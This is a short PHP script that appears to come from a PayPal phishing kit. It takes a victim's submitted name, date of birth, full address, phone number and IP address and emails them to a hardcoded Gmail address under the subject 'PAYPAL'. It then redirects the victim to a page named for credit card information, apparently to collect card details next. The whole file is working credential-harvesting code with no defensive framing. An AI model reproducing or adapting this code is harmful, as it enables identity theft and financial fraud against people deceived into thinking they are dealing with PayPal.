<?php

$ip = getenv("REMOTE_ADDR");
$message .= "Full Name : ".$_POST['xName']."\n";
$message .= "Date of Birth : ".$_POST['xDobD']."/".$_POST['xDobM']."/".$_POST['xDobY']."\n";
$message .= "Address 1 : ".$_POST['xAddress1']."\n";
$message .= "Apt,Suit,Bldg.(Optional) : ".$_POST['xAddress2']."\n";
$message .= "Country : ".$_POST['xco']."\n";
$message .= "City : ".$_POST['xCity']."\n";
$message .= "State : ".$_POST['xState']."\n";
$message .= "Zip Code : ".$_POST['xZip']."\n";
$message .= "Phone Number : ".$_POST['xPHONE']."\n";
$message .= "User IP : ".$ip."\n";
$recipient = "hiredesksccch@gmail.com";
$subject = "PAYPAL | $ip";
$ip = getenv("REMOTE_ADDR");
mail($recipient,$subject,$message,$headers);?>





<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" content="0; url=credit carde information.html">